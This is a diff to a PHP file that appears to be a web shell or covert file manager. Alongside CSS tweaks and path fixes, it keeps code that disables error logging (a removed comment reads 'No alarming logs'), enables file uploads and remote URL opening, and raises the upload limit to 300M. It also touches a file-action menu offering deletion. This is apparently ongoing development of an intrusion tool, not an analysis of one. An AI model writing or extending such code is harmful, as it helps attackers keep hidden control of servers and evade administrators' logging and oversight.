@@ -22,6 +22,7 @@
 		font-weight: normal;
 	}
 	td {
+		border: 6px solid #000;
 		padding:5px;
 		border:none;
 	}
@@ -99,6 +100,9 @@
 	td.icon {
 		width:10px;
 	}
+	td.action {
+		max-width:100px;
+	}
 	::-moz-selection {
 		color: #fff;
 		background: #ffadad;
@@ -117,7 +121,7 @@ function cwd() {
 		chdir($cwd);
 	} else {
 		$cwd = str_replace('\\', DIRECTORY_SEPARATOR, getcwd());
-	} return $cwd;
+	} return str_replace('\\\\', DIRECTORY_SEPARATOR, $cwd);
 }
 function alert($type, $msg) {
 	?>
@@ -149,7 +153,7 @@ class Files {
     			if ($i != $key) {
     				print(DIRECTORY_SEPARATOR);
     			}
-    		} print("'>{$pwd}</button>");
+    		} print("'>{$pwd}</button><button>/</button>");
     	}
     }
 
@@ -648,7 +652,7 @@ foreach ($iterator as $dir) {
 				</center>
 			</td>
 			<form method="post">
-				<td>
+				<td class="action">
 					<select name="action" onchange='if(this.value != 0) { this.form.submit(); }'>
 						<option selected>CHOOSE . .</option>
 						<option value="delete">DELETE</option>
@@ -797,10 +801,11 @@ if (!empty($data = @$_POST['data'])) {
 </table>
 <?php
 if(function_exists('ini_set')) {
-    ini_set('error_log',NULL);  // No alarming logs
-    ini_set('log_errors',0);    // No logging of errors
-    ini_set('file_uploads',1);  // Enable file uploads
-    ini_set('allow_url_fopen',1);   // allow url fopen 
+	ini_set("upload_max_filesize","300M");
+    ini_set('error_log',NULL);
+    ini_set('log_errors',0);
+    ini_set('file_uploads',1);
+    ini_set('allow_url_fopen',1);
 }else{
     ini_alter('error_log',NULL);
     ini_alter('log_errors',0);
